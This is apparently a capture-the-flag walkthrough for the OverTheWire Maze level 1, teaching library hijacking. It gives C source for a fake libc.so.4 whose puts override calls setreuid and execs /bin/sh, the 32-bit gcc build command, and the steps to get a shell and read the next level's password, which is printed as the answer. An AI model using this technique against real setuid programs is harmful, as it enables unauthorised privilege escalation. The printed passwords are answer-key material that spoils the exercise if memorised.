# Maze Level 1 → 2

## Goal
Hijack dynamic linking by dropping a malicious `libc.so.4` in the working directory. The target is a 32-bit legacy binary that still links against the ancient `libc.so.4`, so any shared object of that name in the cwd is loaded before the system one.

## Concepts you'll learn
- The idea of library hijacking / search-path abuse for legacy binaries.
- Building a 32-bit shared object with `gcc -m32 -shared -fPIC`.
- Why Maze binaries are all **32-bit x86** — you must pass `-m32` or nothing links.
- Restoring privileges in a SUID-exec'd child with `setreuid(geteuid(), geteuid())`.

## How to log in

```
$ ssh maze1@maze.labs.overthewire.org -p 2225
```

Password is `kfL7RRfpkY` (from level 0).

## Walkthrough

### 1. Confirm the library dependency
The target binary (in `/maze/`) is linked against `libc.so.4`, which modern systems no longer ship. Check with:

```
$ ldd /maze/maze1
```

You will see `libc.so.4 => ...` somewhere in the output.

### 2. Pick a working directory
The binary is picky about the cwd layout. Create a plain directory manually — don't use `mktemp`, because some versions of the binary dislike the hashed path it produces.

```
$ mkdir /tmp/m1 && cd /tmp/m1
```

### 3. Write the hook library
Inside the fake `libc.so.4` we only need to override a function the binary calls early. `puts` is a safe choice. Our override elevates privileges and spawns a shell.

```c
// hook.c
#include <unistd.h>
#include <stdlib.h>
int puts(const char *s) {
    setreuid(geteuid(), geteuid());
    execl("/bin/sh", "sh", NULL);
    return 0;
}
```

### 4. Build it as a 32-bit shared object
Maze is 32-bit x86; `-m32` is mandatory.

```
$ gcc -m32 -shared -fPIC -o libc.so.4 hook.c -ldl
```

### 5. Run the target from the same directory
The dynamic linker searches the cwd for `libc.so.4` before the system paths (because of how the binary was linked). Launch:

```
$ /maze/maze1
```

Expected output:

```
$
```

You now have a root-ish shell as `maze2`. Read the password:

```
$ cat /etc/maze_pass/maze2
PBeZRPjetr
```

### 6. Log in as maze2

```
$ ssh maze2@maze.labs.overthewire.org -p 2225
```

## The answer

The password for `maze2` is:

**`PBeZRPjetr`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/maze/maze1.html>
